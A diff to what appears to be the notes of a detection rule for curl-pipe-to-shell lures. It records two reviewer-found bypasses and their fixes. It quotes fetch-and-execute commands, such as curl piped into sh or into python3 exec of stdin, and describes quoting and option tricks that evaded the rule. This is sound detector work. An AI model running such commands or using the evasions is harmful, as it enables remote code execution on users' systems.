@@ -63,3 +63,12 @@ These all passed:
 
 - **`$py_danger` is a denylist.** A Python loader not on it that executes stdin would be exempted, though the program still has to fit on one line next to a visible `curl … |`.
 - **The target-word test is lexical.** `curl -s | sh` with flags and no target is not matched, but real lures always name a target.
+
+## Codex review follow-up (831819a)
+
+Two findings reproduced against 831819a and fixed:
+
+- P1: `curl URL | python3 -c 'import sys;''exec(sys.stdin.read())'` was exempted, because `$shell_data` ended at the first quoted segment and `$py_danger` never saw `exec`. The `-c` argument now has to end at a boundary (end of line, space, `; & | ) < > . ,` or a closing backtick), so adjacent or escaped-quote segments keep the finding. Double-quoted programs containing `$` or a backtick are also never exempt (shell expansion).
+- P2: `curl -Kcfg | sh` lost its finding because the target-word requirement did not see an attached option value. The target may now also be `-<flags>K<value>` (capital K only, so `-ks` stays prose), `--config=` or `--url=`.
+
+Evidence (direct runs): the 30-case matrix plus 8 new cases (3 adjacent-segment variants, 4 attached-option variants, `-ks` prose) show 0 mismatches. Consumer sweep over 1,469 files shows no change from the previous branch head (a first, narrower boundary made verify-deps/SKILL.md stricter via a trailing period; widening the boundary fixed it). lint_rules, check_rule_pairs (two new pairs), check_added_rules, measure_precision --fail-over, check_text_controls and the probe with --verify --benign-stdlib all pass.
